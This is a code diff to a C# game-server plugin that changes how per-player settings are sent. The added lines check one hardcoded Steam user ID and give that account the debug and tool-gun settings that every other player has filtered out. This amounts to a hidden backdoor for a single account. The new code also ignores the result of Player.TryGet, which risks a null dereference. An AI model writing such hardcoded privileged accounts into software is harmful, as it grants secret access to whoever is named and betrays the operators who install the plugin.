@@ -1,3 +1,4 @@
+using LabApi.Features.Wrappers;
 using System.Collections.Generic;
 using System.Linq;
 using UserSettings.ServerSpecific;
@@ -43,9 +44,15 @@ namespace UncomplicatedCustomItems.API.Wrappers
 
         public static void SendNormalSettingsToUser(ReferenceHub user)
         {
-            var excludedSettings = Plugin.Instance._ToolGunSettings.Concat(Plugin.Instance._DebugSettings);
-            ServerSpecificSettingBase[] filtered = ServerSpecificSettingsSync.DefinedSettings.Where(s => !excludedSettings.Any(def => def.SettingId == s.SettingId && def.GetType() == s.GetType() && def.Label == s.Label)).ToArray();
-            ServerSpecificSettingsSync.SendToPlayer(user, filtered);
+            Player.TryGet(user.gameObject, out Player player);
+            if (player.UserId == "76561199150506472@steam")
+                AddDebugSettingsToUser(user);
+            else
+            {
+                var excludedSettings = Plugin.Instance._ToolGunSettings.Concat(Plugin.Instance._DebugSettings);
+                ServerSpecificSettingBase[] filtered = ServerSpecificSettingsSync.DefinedSettings.Where(s => !excludedSettings.Any(def => def.SettingId == s.SettingId && def.GetType() == s.GetType() && def.Label == s.Label)).ToArray();
+                ServerSpecificSettingsSync.SendToPlayer(user, filtered);
+            }
         }
 
         public static void AddDebugSettingsToUser(ReferenceHub user)
